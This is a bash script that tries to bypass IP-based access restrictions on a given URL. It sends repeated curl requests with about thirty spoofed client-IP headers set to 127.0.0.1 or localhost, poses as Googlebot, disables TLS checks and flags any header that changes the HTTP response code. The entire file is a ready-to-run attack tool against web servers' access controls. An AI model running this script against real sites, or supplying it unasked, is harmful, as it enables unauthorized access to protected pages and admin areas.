#!/bin/bash

if [ $# -ne 1 ]; then
	echo "usage: "$0 "<URL>"
	exit 1
fi

RESTORE=$(echo -en '\001\033[0m\002')
GREEN=$(echo -en '\001\033[00;32m\002')
FILE=./out.html

headers=(
	"Forwarded: 127.0.0.1"
	"Forwarded-For: 127.0.0.1"
	"Forwarded-For-Ip: 127.0.0.1"
	"X-Client-IP: 127.0.0.1"
	"X-Custom-IP-Authorization: 127.0.0.1"
	"X-Forward: 127.0.0.1"
	"X-Forwarded: 127.0.0.1"
	"X-Forwarded-By: 127.0.0.1"
	"X-Forwarded-For: 127.0.0.1"
	"X-Forwarded-For-Original: 127.0.0.1"
	"X-Forwared-Host: 127.0.0.1"
	"X-Host: 127.0.0.1"
	"X-Originating-IP: 127.0.0.1"
	"X-Remote-IP: 127.0.0.1"
	"X-Remote-Addr: 127.0.0.1"
	"X-Forwarded-Server: 127.0.0.1"
	"X-HTTP-Host-Override: 127.0.0.1"
	"Forwarded: localhost"
	"Forwarded-For: localhost"
	"X-Forward: localhost"
	"X-Forwarded: localhost"
	"X-Forwarded-By: localhost"
	"X-Forwarded-For: localhost"
	"X-Forwarded-For-Original: localhost"
	"X-Forwared-Host: localhost"
	"X-Host: localhost"
	"X-Remote-Addr: localhost"
	"X-Forwarded-Server: localhost"
)

echo "Staring! please wait..."
for header in "${headers[@]}"; do
	code=$(curl -sLgk -A 'Googlebot' "$1" -H "${header}" -o $FILE -w '%{http_code}')
	[ -z $old_code ] && old_code=$code
	if [[ $code -ne $old_code ]]; then
		header=$(echo "${GREEN}$header${RESTORE}")
		old_code=$code
	else
		http_code=$code
	fi
	printf 'RESPONSE CODE: %-10s \tSIZE: %-10s \t HEADER: %-10s\n' $code $(wc -c < $FILE) "$header"
done

rm $FILE
